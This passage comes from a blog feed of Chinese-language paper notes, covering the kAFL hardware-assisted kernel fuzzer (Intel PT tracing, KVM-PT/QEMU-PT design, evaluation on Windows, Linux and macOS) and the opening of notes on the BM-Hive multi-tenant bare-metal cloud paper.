这样的分支记录技术，输出缓冲区的大小仅受主存大小而非特定寄存器的限制，输出格式基于数据包（packet-oriented）并分为通用执行信息与控制流信息包；Intel 在运行时提供各类控制流相关的数据包类型，因此我们需要用被跟踪的软件来翻译包含控制流分支地址的包</p><p>Intel 指定了五种类型的控制流影响指令，称为 <code>Change of Flow Instruction</code> （CoFI），不同类型的 CoFI 执行结果产生不同的信息包流，与本文相关的三种为：</p><ul><li><strong>Taken-Not-Taken</strong>（TNT）：条件跳转是否执行</li><li><strong>Target IP</strong>（TIP）：间接跳转或转移指令（<code>indirect branch, near ret, far transfer</code>）的目标</li><li><strong>Flow Update Packets</strong>（FUP）：如中断或陷阱等异步事件， FUP 之后通常跟随一个 TIP 以指示接下来的指令</li></ul><p>为了限制生成的数据量，Intel PT 提供了多种运行时过滤选项，如指令指针地址范围或特权级别（CPL），kAFL 以此将追踪限制为内核模式，同时利用 CR3 过滤来限制为特定的软件</p><p>Intel PT 支持为输出数据配置多目标域，kAFL 关注于允许指定多个输出区域的物理地址表（Table of Physical Addresses，ToPA）机制：每个 ToPA 表包含多个 ToPA 条目，其中包含用来存储追踪数据的内存块的物理地址、大小、类型（用于指示 CPU 访问 ToPA 表项时的行为）等信息</p><h1 id="0x03-System-Overview"><a href="#0x03-System-Overview" class="headerlink" title="0x03. System Overview"></a>0x03. System Overview</h1><p>这节介绍系统总体架构，分为三个组件：fuzzing logic、VM infrastructure（ QEMU-PT 与 KVM-PT）、user mode agent，整体架构如图 1 所示：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20240130045624.png"></p><p>模糊测试过程如图 2 所示：</p><ul><li><p>在 VM 启动时 user mode agent 的第一部分（loader）使用 hypercall <code>HC_SUBMIT_PANIC</code> 来向 QEMU-PT 提交 <code>kernel panic handler</code>  （Windows 下为 <code>BugCheck()</code> ）的地址，QEMU-PT 将其更改为一个 hypercall 调用例程以让我们快速得知 VM 中的 crashes</p></li><li><p>loader 使用 hypercall <code>HC_GET_PROGRAM</code> 来获取实际的 user mode agent 并启动</p></li><li><p>fuzzer 开始初始化，agent 触发一个会由 KVM-PT 处理的 hypercall <code>HC_SUBMIC_CR3</code>，hypervisor 从当前运行的程序中提取 CR3 的值并交给 QEMU-PT 进行过滤</p></li><li><p>最后，agent 使用 hypercall <code>HC_SUBMIT_BUFFER</code> 来提交其想要获取输入的地址，接下来开始主 fuzzing 循环</p></li><li><p>在主循环中，agent 通过 hypercall  <code>HC_GET_INPUT</code> 来获取新的输入，fuzzing logic 生成一个新的输入并交给 QEMU-PT 由其拷贝到 guest 内存中</p></li><li><p>在 VM-Entry 恢复虚拟机执行时开启 PT 追踪机制，此时 agent 使用输入与内核交互，在 Fuzzing 过程中 QEMU-PT 解码追踪数据并在需要时更新位图</p></li><li><p>交互完成后 agent 通过 hypercall <code>HC_FINISHED</code> 告知 hypervisor 停止追踪，位图被传递给 fuzzing logic 后续使用</p></li><li><p>最后 agent 可以继续运行任何未被追踪的清理程序，然后发出另一个 <code>HC_GET_INPUT</code> 以启动下一次循环迭代</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20240130045949.png"></p><h2 id="3-1-Fuzzing-Logic"><a href="#3-1-Fuzzing-Logic" class="headerlink" title="3.1 Fuzzing Logic"></a>3.1 Fuzzing Logic</h2><p><code>fuzzing logic</code> 是 kAFL 的控制组件，负责管理种子、生成输入等，大量采用了 AFL 所用的算法（如使用位图记录块转移），且使用并行 VM 协调提升性能，并负责与 QEMU-PT 通信以及显示统计数据</p><h2 id="3-2-User-Mode-Agent"><a href="#3-2-User-Mode-Agent" class="headerlink" title="3.2 User Mode Agent"></a>3.2 User Mode Agent</h2><p>在目标 OS 中运行的 <code>User Mode Agent</code> 通过 hypercall 与 <code>fuzzing logic</code> 同步并获取新输入以与内核交互，在实践中作者额外使用<code>loader component</code> 通过 hypercall 接收  <code>User Mode Agent</code> 二进制并执行，同时负责检查 agent 的状态</p><h2 id="3-3-Virtualization-Infrastructure"><a href="#3-3-Virtualization-Infrastructure" class="headerlink" title="3.3 Virtualization Infrastructure"></a>3.3 Virtualization Infrastructure</h2><p><code>fuzzing logic</code> 使用 QEMU-PT 与 KVM-PT 交互以创建 VMs，KVM-PT 允许我们限定 Intel PT 范围为 vCPU 执行期间，QEMU-PT 负责与 KVM-PT 交互以配置 Intel PT 并访问与解码 output buffer 的追踪数据为被执行的条件跳转指令的地址的流，且基于已知非确定性基本款地址进行过滤（以预防假阳性）后以 AFL 兼容的位图格式提供给 fuzzing logic</p><p>作者使用客制化的 Intel PT 解码器，与 Intel 的现有方案比带来了性能提升</p><h2 id="3-4-Stateful-and-Non-Deterministic-Code"><a href="#3-4-Stateful-and-Non-Deterministic-Code" class="headerlink" title="3.4 Stateful and Non-Deterministic Code"></a>3.4 Stateful and Non-Deterministic Code</h2><p>内核层的状态与异步性导致的不确定性需要被处理，状态不会被重置因为快照加载成本过高，中断可能带来不确定性基本块转移，作者使用两种技术解决这些问题：</p><p>第一种是过滤出中断及中断处理造成的转移，这可以通过 Intel PT 的追踪数据（带有 FUP 的 TIP）指示，丢弃直到 <code>iret</code> 指令前的基本块，同时通过一个简易的调用栈追踪所有中断（因为可能存在中断嵌套）</p><p>第二种是拉黑所有非确定性出现的基本块，作者会在位图更新时连续多次重新运行输入，将没有在所有试验中出现的基本块拉入黑名单，在后续处理在过滤</p><blockquote><p>注：笔者认为作者使用的第二种技术可能会存在非常大的假阳性，因为内核在不同状态下同一输入的结果可能也是不同的</p></blockquote><h2 id="3-5-Hypercall"><a href="#3-5-Hypercall" class="headerlink" title="3.5 Hypercall"></a>3.5 Hypercall</h2><p>hypercall 由 <code>vmcall</code> 指令调起以主动触发 VM-Exit，作者修改了 KVM-PT 以接收 ring3 的 hypercall，并通过 <code>rcx</code> 寄存器传参，例如 <code>HC_SUBMIT_BUFFER</code> 通过 <code>rcx</code> 存储一个 guest 指针，另一个例子是告知 <code>fuzzing logic</code> 目标 OS 发生了 crash，注入的代码如 List 1 所示</p><p><img src="https://s2.loli.net/2024/07/30/WHY1MB5kzoqf6cp.png" alt="Listing 1: Hypercall crash notifier."></p><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><p>代码开源于 <a href="https://github.com/RUB-SysSec/kAFL">https://github.com/RUB-SysSec/kAFL</a></p><h2 id="4-1-KVM-PT"><a href="#4-1-KVM-PT" class="headerlink" title="4.1 KVM-PT"></a>4.1 KVM-PT</h2><p>Intel PT 允许我们在不修改&#x2F;重编译目标内核的情况下追踪分支转移，据作者所知过去不曾有公开可用的驱动能够使用 Intel PT 仅追踪单个 vCPU 的 guest 执行，如 <a href="https://github.com/andikleen/simple-pt">Simple-PT</a> 在设计上不支持长期追踪，<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/plain/tools/perf/Documentation/intel-pt.txt?id=refs/tags/v4.8">perf-subsystem</a> 可以长期追踪但仅能追踪逻辑 CPU 而非 vCPU</p><p>为了解决这些缺点，作者开发了 KVM-PT，其允许我们在无限长的时间内追踪 vCPU ，并导出一个用户模式接口供 QEMU-PT 访问追踪数据</p><h3 id="4-1-1-vCPU-Specific-Traces"><a href="#4-1-1-vCPU-Specific-Traces" class="headerlink" title="4.1.1 vCPU Specific Traces"></a>4.1.1 vCPU Specific Traces</h3><p>开启 Intel PT 需要在 ring0 启用 MSR 寄存器的 <code>IA32_RTIT_CTL_MSR.TraceEn</code> 位，这需要在进入 VM 前完成，在 VM-Exit 后则需要反向操作，而手动修改 MSR 会产生不必要的追踪数据，作者使用 Intel VT-x 的 MSR 自动加载功能（如修改 <code>VMCS.VM_ENTRY_CONTROL_MSR</code> ）来在 VM-Entry &amp; VM-Exit 时加载预配置 MSR</p><blockquote><p>笔者注：这点事都能写这么一大段❓</p></blockquote><h3 id="4-1-2-Continuous-Tracing"><a href="#4-1-2-Continuous-Tracing" class="headerlink" title="4.1.2 Continuous Tracing"></a>4.1.2 Continuous Tracing</h3><p>如图 3 所示的物理地址表（Table of Physical Addresses,ToPA）项结构体数组用以指示 Intel PT 如何填充缓冲区，在主缓冲区填满后 CPU 可以停止追踪或是产生能造成 VM-Exit 的中断（当前的实现为非即时）以让 VMM 重置缓冲区后恢复 VM 执行，overflow buffer 被放置在 main buffer 后以避免实际传递中断前可能的追踪数据丢失（其若也溢出则导致追踪停止，此时会新增一个数据表指示数据丢失）</p><p><img src="https://s2.loli.net/2024/07/30/A4IKLpswex36Vi5.png" alt="Figure 3: KVM-PT ToPA configuration."></p><h2 id="4-2-QEMU-PT"><a href="#4-2-QEMU-PT" class="headerlink" title="4.2 QEMU-PT"></a>4.2 QEMU-PT</h2><p>QEMU-PT 通过 KVM-PT 的用户空间接口（<code>ioctl()</code> 与 <code>mmap()</code> ）配置 Intel PT 并定期检查 ToPA，并将 Intel PT 数据包解码为类似 AFL 的位图</p><p><img src="https://s2.loli.net/2024/07/30/EaOTDcZjyh6oWrX.png" alt="Figure 4: Overview of the pipeline that converts Intel PT traces to kAFL bitmaps."></p><h3 id="4-2-1-PT-Decoder"><a href="#4-2-1-PT-Decoder" class="headerlink" title="4.2.1 PT Decoder"></a>4.2.1 PT Decoder</h3><p>解码器需要足够高效以应对产生速率为几百 MB 每秒的内核模糊测试追踪数据，且需要足够的精确</p><p>Intel 为客制 Intel PT 解码器提供了自己的通用解码引擎 <a href="https://github.com/intel/libipt">libipt</a> ，但 kAFL 仅依赖流信息，而 libipt 在提供执行数据与流信息的同时并不缓存反汇编指令，因此作者实现了一个类似即时（just-in-time）解码器的软件，并缓存所有反汇编指令以优化查找，同时忽视与测试用例无关的数据包</p><p>作者的解码器在 ToPA 区域被填充后便开始解码（而非等待填满），并翻译为 AFL 位图格式</p><h2 id="4-3-AFL-Fuzzing-Logic"><a href="#4-3-AFL-Fuzzing-Logic" class="headerlink" title="4.3 AFL Fuzzing Logic"></a>4.3 AFL Fuzzing Logic</h2><p>作者的 fuzzing logic 与 AFL 十分相似，每个基本块被给予一个随机 ID，从块 A 到 B 的转移被通过如下方程赋予一个偏移值到位图中：</p><p><img src="https://s2.loli.net/2024/07/30/IiFG56ULtmM2qlZ.png"></p><p>不同于编译期随机，kAFL 使用基本块的地址作为 ID，在观测到转移后便增加位图中计数，在 fuzzing 迭代结束后将位图的每个 entry 舍入以仅保留最高位，并与全局静态位图对比以检查是否发现新位，若是则添加到全局静态位图并将触发新位的输入添加到队列中，当发现了有趣的输入时则进行逐字节变异，该阶段完成后在随机位置进行变异（若前阶段发现新的输入则将推迟），触发新转移的输入将会给予更高的优先级</p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>作者的实验机器为 <code>Intel i7-6700 processor, 32 GB DDR4 RAM</code> ，为避免 IO 性能影响，所有基准测试在一个 RAM disk 上完成</p><p>类似 AFL ，若一个造成 crash  的输入触发了此前未有的基本块转移，则作者认为其是唯一的（但不意味着底层错误唯一）</p><h2 id="5-1-Fuzzing-Windows"><a href="#5-1-Fuzzing-Windows" class="headerlink" title="5.1 Fuzzing Windows"></a>5.1 Fuzzing Windows</h2><p>作者实现了一个小的特定于 Windows 10 的 user mode agent，通过虚拟磁盘对 NTFS 的 4 天 + 19 小时 fuzzing 后找到了 59 个独立的 crashes（都是除以 0 错误），经检查作者怀疑可能只有一个独立的错误</p><p>此外作者还实现了一个通用 syscall fuzzing agent，但在 Windows 下 13 个小时的 6.3 百万次执行中未发现 crash，由于 kAFL 得益于覆盖率反馈很快习得如何生成有效载荷以执行有效系统调用，导致了 fuzzing agent 中的意外的用户回调，从而使得 agent 需要高昂开销以重启，导致美妙仅能执行约 134 次</p><h2 id="5-2-Fuzzing-Linux"><a href="#5-2-Fuzzing-Linux" class="headerlink" title="5.2 Fuzzing Linux"></a>5.2 Fuzzing Linux</h2><p>作者为 Linux 实现了一个类似的 agent 以测试 ext4 ，但效率比 Windows 快得多（每秒 1k～2k次执行），从而在 12 天的测试中发现了 160 个独立的 crash 并确认了多个 bug，图 5 展示了另一个模糊测试的前 32 小时</p><p><img src="https://s2.loli.net/2024/07/30/qjA8raLVybPzdWI.png" alt="Figure 5: Fuzzing the ext4 kernel module for 32 hours."></p><h2 id="5-3-Fuzzing-macOS"><a href="#5-3-Fuzzing-macOS" class="headerlink" title="5.3 Fuzzing macOS"></a>5.3 Fuzzing macOS</h2><p>作者在 HFS 驱动中找到了 150 个 crash 并手动确认了至少三个为导致内核崩溃的独立漏洞，这可以造成 DoS 攻击，此外 kAFL 在 APFS 内核扩展中发现了 220 个独立的 crash，目前都被上报给了 Apple</p><h2 id="5-4-Rediscovery-of-Known-Bugs"><a href="#5-4-Rediscovery-of-Known-Bugs" class="headerlink" title="5.4 Rediscovery of Known Bugs"></a>5.4 Rediscovery of Known Bugs</h2><p>作者在 <code>keyctl()</code> 接口上评估了 kAFL，成功找到此前已知的 CVE-2016-07583，并找到了一个未知错误（已被分配为 CVE-2016-86504），其在短短一小时内成功触发 17 个独立的 KASan 报告与 15 个独立的 panic，生成了超过 3400 万个输入，发现了 295 个有趣的输入，每秒执行约 9k 次，该实验为 8 进程并行</p><h2 id="5-5-Detected-Vulnerabilities"><a href="#5-5-Detected-Vulnerabilities" class="headerlink" title="5.5 Detected Vulnerabilities"></a>5.5 Detected Vulnerabilities</h2><p>kAFL 在测试过程中发现超过 1k 个独立的 crash，作者手动分析了一部分并与对应的维护者确认了如下漏洞：</p><p><img src="https://s2.loli.net/2024/07/30/fiTSLREMCYJ3yUF.png"></p><h2 id="5-6-Fuzzing-Performance"><a href="#5-6-Fuzzing-Performance" class="headerlink" title="5.6 Fuzzing Performance"></a>5.6 Fuzzing Performance</h2><p>作者创建了一个基于 jsmn 的 JSON parser driver（如 List 2 所示，在 JSON 字符串以 <code>&quot;KAFL&quot;</code> 起始时触发 crash）并在三个系统上进行了测试，并与 TriforceAFL 和 syzkaller 进行对比</p><p><img src="https://s2.loli.net/2024/07/30/SjNFMhyBD1oHze6.png" alt="Listing 2: The JSON parser kernel module used for the coverage benchmarks."></p><p>30 分钟的测试结果如表 1 所示，然而 TriforceAFL 未能触发崩溃路径，因而很难与 kAFL 比较覆盖率</p><p><img src="https://s2.loli.net/2024/07/30/xW3cr8Zqo2fleR9.png" alt="Table 1: kAFL and TriforceAFL fuzzing performance on the JSON sample driver."></p><p>覆盖率结果如图 6 所示，不过随着 fuzzing 时间增长，新路径更难被发现，因此这不是个好的指标</p><p><img src="https://s2.loli.net/2024/07/30/rYB9mdXJPUAhbRt.png" alt="Figure 6: Coverage comparison of kAFL (initramfs) and TriforceAFL. kAFL takes less than 3 minutes to find the same number of paths as TriforceAFL does in 30 minutes (each running 1 process)."></p><p>图 7 显示了 kAFL 与 TriforceAFL 在 raw execution 上的性能对比</p><p><img src="https://s2.loli.net/2024/07/30/4ArNBvGP57hx8Hn.png" alt="Figure 7: Raw execution performance comparison."></p><p>与 syzkaller 间作者并未做性能对比，因为其是一个高度特定的 syzkaller fuzzer，且其知识使其可以在无反馈下产生更高的代码覆盖率，因此除非作者实现了相同的系统调用逻辑，否则覆盖率对比会存在误导性</p><h2 id="5-7-KVM-PT-Overhead"><a href="#5-7-KVM-PT-Overhead" class="headerlink" title="5.7 KVM-PT Overhead"></a>5.7 KVM-PT Overhead</h2><p>作者在一个 <code>i5-6500@3.2Ghz</code> 桌面环境中对了不同的 KVM-PT 配置，将追踪限定在内核地址空间，图 8 说明了没有 KVM-PT 下的执行相对开销</p><blockquote><p>多的不抄了，自己看原文：）</p></blockquote><p><img src="https://s2.loli.net/2024/07/30/e1QHoCktLNDbGvu.png" alt="Figure 8: Overhead for compiling QEMU-2.6.0 in a traced VM."></p><h2 id="5-8-Decoder-Engine"><a href="#5-8-Decoder-Engine" class="headerlink" title="5.8 Decoder Engine"></a>5.8 Decoder Engine</h2><p>解码过程没有硬件加速，因此解码器对 fuzzing 整体性能有显著影响，作者将自己的解码器与 Intel ptxed 进行了对比，在一个 <code>i5-6500@3.2Ghz</code> 环境中进行了测试，结果如图 9 所示</p><p><img src="https://s2.loli.net/2024/07/30/bZ7wTskyI1F2dm9.png" alt="Figure 9: kAFL and ptxed decoding time on multiple copies of the same trace (kAFL is up to 30 times faster)."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><h2 id="6-1-Black-Box-Fuzzers"><a href="#6-1-Black-Box-Fuzzers" class="headerlink" title="6.1 Black-Box Fuzzers"></a>6.1 Black-Box Fuzzers</h2><p>此类 fuzzer 与目标程序没有任何交互，为了提高效率通常会进行一些假设，例如 <a href="https://github.com/aoh/radamsa">Radamsa</a> 或 <a href="https://github.com/samhocevar/zzuf">zzuf</a> 会假设大量覆盖率良好的输入会反复发生变异与重组，而 <a href="http://www.peachfuzzer.com/">Peach</a> 与 <a href="https://github.com/OpenRCE/sulley">Sulley</a> 需要程序员指定如何生成看起来几乎像真正文件的半可用输入文件；上述这些都有一个重要缺陷：耗时过高</p><p>为了提高黑盒 fuzzer 的性能，研究人员提出了不少技术，如 <a href="https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/holler">Holler 提出了从旧的 crash 输入中习得输入语法的有趣部分</a> ，还有人提出根据程序追踪来推断输入语法等，<a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf">Rebert 则优化了对有趣输入的选择</a></p><h2 id="6-2-White-Box-fuzzers"><a href="#6-2-White-Box-fuzzers" class="headerlink" title="6.2 White-Box fuzzers"></a>6.2 White-Box fuzzers</h2><p>程序分析方法被引入以减少测试负担，类似 <a href="https://dl.acm.org/doi/pdf/10.1145/2090147.2094081">SAGE</a> 、<a href="https://dl.acm.org/doi/10.1145/1064978.1065036">DART</a> 、 <a href="https://www.usenix.org/legacy/event/osdi08/tech/full_papers/cadar/cadar.pdf">KLEE</a> 、 <a href="https://www.usenix.org/legacy/events/sec09/tech/full_papers/molnar.pdf">SmartFuzz</a> 、<a href="https://ieeexplore.ieee.org/document/6234425">Mayhem</a> 这样的工具尝试使用符号执行与约束求解技术枚举复杂路径，<a href="https://ieeexplore.ieee.org/document/5504701">TaintScope</a> 、<a href="https://ieeexplore.ieee.org/document/5070546">BuzzFuzz</a> 、<a href="https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/vuzzer-application-aware-evolutionary-fuzzing/">Vuzzer</a> 利用污点追踪与类似的动态分析技术来发现新路径，他们通常都能找到隐藏在 checksum、magic constraint 等难以被随机输入满足的复杂代码路径，另一种办法是使用相同类型的信息来搜索危险行为而非新代码路径</p><p>缺点是这些技术通常难以实现并扩展到大型程序上，据作者所知目前暂时没有针对操作系统的这样的工具</p><h2 id="6-3-Gray-Box-Fuzzers"><a href="#6-3-Gray-Box-Fuzzers" class="headerlink" title="6.3 Gray-Box Fuzzers"></a>6.3 Gray-Box Fuzzers</h2><p>灰盒 fuzzer 在保留黑盒的高吞吐量与简易性获得白盒所使用的高级机制提供的额外覆盖，比较好的灰盒测试的例子是 AFL，其使用覆盖率信息指引以避免在不触发新状态的输入上耗费时间，其他的一些 fuzzer 也使用了类似机制</p><p>为了进一步提高灰盒测试的有效性，许多用在黑盒测试中的技术也被使用，例如 <a href="https://dl.acm.org/doi/10.1145/2976749.2978428">Böhme 展示了如何使用马尔可夫链来提高灰盒测试性能</a></p><h2 id="6-4-Coverage-Guided-Kernel-Fuzzers"><a href="#6-4-Coverage-Guided-Kernel-Fuzzers" class="headerlink" title="6.4 Coverage-Guided Kernel Fuzzers"></a>6.4 Coverage-Guided Kernel Fuzzers</h2><p>Vyukov 放出的项目 <a href="https://github.com/google/syzkaller">syzkaller</a> 是第一个公开的能够用于覆盖率引导的内核 fuzzer ；Nossum 与 Casanovas 通过一个<a href="https://events.static.linuxfound.org/sites/events/files/slides/AFL%20filesystem%20fuzzing%2C%20Vault%202016_0.pdf">修改版 AFL</a> 证明了绝大部分 Linux 文件系统驱动对于反馈驱动的模糊测试都是脆弱的</p><p>Hertz 和 Newsham 在 2016 年发布了名为 <a href="https://github.com/nccgroup/TriforceAFL">TriforceAFL</a> 的 AFL 修改版，其基于一个修改版的 QEMU ，利用了对应的模拟后端通过在执行控制流更改指令后确定当前的指令指针来测量模糊测试进度，这理论上可以测试任何 QEMU 能模拟的操作系统，但事实上 TriforceAFL 仅限于能够从只读文件系统启动的操作系统（基本上只有 UNIX-like），无法测试 macOS 或 Windows 等闭源操作系统</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>作者的工作仍有一些缺陷</p><p><strong>OS-Specific Code.</strong>  作者使用了少量特定于操作系统的代码来执行三个任务：将模糊测试输入转为与操作系统的交互、获取操作系统对崩溃处理程序的地址、返回某些驱动程序的地址</p><p>这些功能都不是必须的，第一个问题可以用通用系统调用来避免，同时也不一定需要崩溃处理程序的地址来检测 VM crash</p><p><strong>Supported CPUs.</strong> 本文的工作局限于支持 Intel VT-x 技术的 CPU，但对于哪些 CPU 确乎支持指令指针过滤、multi-entry ToPA 等含糊其辞，</p><p><strong>Just-In-Time Code.</strong> intel PT 并不提供已执行指令指针的完整列表，这需要解码器完成控制流重建，但若程序在运行时被修改（例如 JIT）则无法准确恢复运行时控制流，因此解码器需要对程序应用的修改信息，如 <a href="https://dl.acm.org/doi/10.1145/2523649.2523675">Deng 等人使用 EPT violation 实现</a>，更老的做法是<a href="https://dl.acm.org/doi/10.1145/1455770.1455779">使用影子页表</a></p><p><strong>Multibyte Compares.</strong> 本文的工作无法知道程序中较大的 magic values，但使用比如混合执行（如 <a href="https://sites.cs.ucsb.edu/~vigna/publications/2016_NDSS_Driller.pdf">Driller</a> ）或是污点追踪（如 <a href="https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/vuzzer-application-aware-evolutionary-fuzzing/">Vuzzer</a> ）技术可以提高性能，但都无法轻易被应用到闭源操作系统内核中</p><p><strong>Ring 3 Fuzzing.</strong> 作者仅针对内核代码使用了该技术，但这个方法也适用于用于用户态，作者预计其将由于基于动态二进制插桩的方法（如 <a href="https://github.com/googleprojectzero/winafl">winAFL</a> ）</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><p>作者提出了使用 CPU 新特性的反馈驱动的内核模糊测试方法，性能明显优于其他方法，很好很强大🎆🎇🎇🎆</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Rabbit’s adventures in kernel land&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="系统虚拟化" scheme="https://arttnba3.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Intel PT" scheme="https://arttnba3.github.io/tags/Intel-PT/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x06】论文笔记：High-density Multi-tenant Bare-metal Cloud</title>
    <link href="https://arttnba3.github.io/2024/07/27/PAPER-0X06-ASPLOS2020_BMHIVE/"/>
    <id>https://arttnba3.github.io/2024/07/27/PAPER-0X06-ASPLOS2020_BMHIVE/</id>
    <published>2024-07-26T20:25:38.000Z</published>
    <updated>2024-07-26T20:32:12.364Z</updated>
    
    <content type="html"><![CDATA[<p>出走字节 IaaS 开发实习两年，归来读安全 PhD 依然在做 DPU</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近不知道为什么又开始看 DPU 了（反正就是啥都想弄一点），所以先从这篇非常经典的论文入手：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>虚拟化技术是 IaaS 的基石，虽然多租户共享同一物理机提高了数据中心服务器的利用率，但带来对安全问题的忧虑（尤其是侧信道攻击），且增加了资源开销；新兴的裸金属云提供了强隔离性与对硬件的完全访问，但只能将整台物理服务器租给用户，无法在出租后对用户程序控制，且扩展性差、成本效率低</p><p>本文提出一种新的高密度、多租户裸金属云设计：<code>BM-Hive</code> ，每个裸金属客户运行在各自的计算板上——带有专有 CPU 与内存的 PCIe 扩展板，其软硬件混合 virtio I&#x2F;O 系统允许客户直接访问云网络与存储设备；<code>BM-Hive</code> 可以显著提升裸金属服务的成本效益，从硬件层分隔裸金属用户以提供更好的安全与隔离；<code>BM-Hive</code> 被作者部署在最大的公有云基础设施之一上，为数万用户同时服务</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>虚拟化技术是公有 IaaS 云的基石，EPT 这样的高级虚拟化技术显著提升了 VM 性能，但多租户共享同一物理机带来对安全与性能的忧虑，尤其是针对 CPU 缓存与超线程等紧密结合的资源的侧信道攻击，此外共享资源冲突可以带来不可预估的性能波动</p><p><strong>Limitations of existing approach</strong> ：为了解决这些问题，租户独占物理机的裸金属服务出现了（称为单租户裸金属服务器，因为只能整个租出），但其仍有一些成本效益、性能、互通性上的限制：</p><ul><li><strong>Cost</strong> ：单租户裸金属服务器只能整个租出，但用户不一定需要这么多性能</li><li><strong>Single-thread performance</strong> ：绝大多数云服务器使用核数多但单核弱的 Xeon ，裸金属服务的用户通常需要更高性能</li><li><strong>Interoperability and manageability</strong> ：裸金属服务必须无缝结合到现有云系统中以从弹性云架构中受益，然而单租户裸金属服务与现有的基于 VM 的云不同，其通常由 Intel Management Engine 类已知不安全系统管理，且裸金属服务应当与 VM 镜像兼容以复用镜像</li></ul><p><strong>Our approach</strong> ：本文给出 <code>BM-Hive</code> 的设计：一个可以解决所有这些挑战的可扩展的多租户裸金属服务，其由三部分组成：一个裸金属 hypervisor （ <code>bm-hypervisor</code> ，对应传统的 <code>vm-hypervisor</code> ）、一组裸金属客户（ <code>bm-guest</code> ，对应传统的 <code>vm-guest</code>）、一个 IO 枢纽（<code>IO-Bond</code>）； <code>bm-hypervisor</code> 运行在服务器主 CPU 上管理所有 guests 的生命周期并作为 <code>IO-Bond</code> 后端，但不似 <code>vm-hypervisor</code> 那样要虚拟化 CPU 或内存，而是每个 <code>bm-guest</code> 都运行在各自的计算板上（由专有处理器、内存单元、PCIe 接口组成）； <code>IO-Bond</code> 作为硬件的一部分由 FPGA 进行实现以用于在主板与计算板间通信，其一方面模拟 I&#x2F;O 设备（例如 virtio 网络与块设备），另一方面将计算板与主板的 PCIe 总线连接并转发  <code>bm-guest</code> 的 I&#x2F;O 请求到  <code>bm-hypervisor</code> </p><p> <code>BM-Hive</code> 的设计充分解决了单租户裸金属服务的限制， <strong>首先</strong> ， <code>BM-Hive</code> 可以在一个  <code>BM-Hive</code> 服务器上支持 16 个 <code>bm-guest</code> ，提升服务密度的同时降低开销， <strong>其次</strong> ，<code>bm-guest</code> 可以使用任何计算板所支持的 CPU, <strong>最后</strong> ， <code>BM-Hive</code> 可以无缝融合到现有云基础架构中；最主要的区别是 <code>vm-guest</code> 运行在虚拟 CPU 上，而 <code>bm-guest</code> 运行在计算板上，而这对云基础架构而言是无感知的（归功于 <code>bm-hypervisor</code> 与 <code>IO-Bond</code> ），表 1 对比了三种类型云服务的不同层；此外 <code>bm-guest</code> 无法完全控制整个服务器， <code>bm-hypervisor</code> 通过 PCIe 接口控制其执行，且 <code>IO-Bond</code> 在硬件中强制对 <code>bm-guest</code> 进行适当隔离</p><p><img src="https://s2.loli.net/2024/07/25/xhGA7yFgsMUo1c4.png" alt="Table 1. Comparison of three cloud services"></p><p>作者在最大的 IaaS 公有云数据中心之一部署了 <code>BM-Hive</code> ，并彻底分析了其安全性与性能表现，其实验展示了 <code>BM-Hive</code> 的强隔离、安全与性能</p><p>总而言之，本文贡献如下：</p><ul><li>作者提出来新的裸金属云设计，结合了现有基于 VM 的与单租户裸金属的服务器的优点，并提供安全、灵活、可操作的裸金属云服务</li><li><code>BM-Hive</code> 有软硬件结合的 virtio 系统，让 guests 可以直接与现有云基础架构结合，直接获得云服务的可用性与弹性</li><li>作者基于 <code>BM-Hive</code> 的设计构建了一个产品级的系统并在真实的云中部署，证明了 <code>BM-Hive</code> 的可行性</li><li>作者在最大的公有云基础设施之一部署了 <code>BM-Hive</code> 并充分测量其性能，证明了其相对基于 VM 的云服务的优点</li></ul><h1 id="0x02-Background-and-Motivation"><a href="#0x02-Background-and-Motivation" class="headerlink" title="0x02. Background and Motivation"></a>0x02. Background and Motivation</h1><p><strong>Background</strong> ：虚拟化是传统云的关键技术，主要有 CPU、内存、I&#x2F;O 三个层面，CPU 与 内存虚拟化由处理器提供，云上 I&#x2F;O 则通常是半虚拟化，Guest侧内核直接请求与处理高级 I&#x2F;O 操作，而非模拟低级 I&#x2F;O 操作（如寄存器访问），或是直接硬件设备直通</p><h2 id="2-1-Impact-on-Performance"><a href="#2-1-Impact-on-Performance" class="headerlink" title="2.1 Impact on Performance"></a>2.1 Impact on Performance</h2><p><strong>Performance overhead</strong> ：许多事件都能产生 VM exits 而造成大量开销（单个 exit 事件至少 10 µs 的情况下，每秒 5000+ 次 VM exit 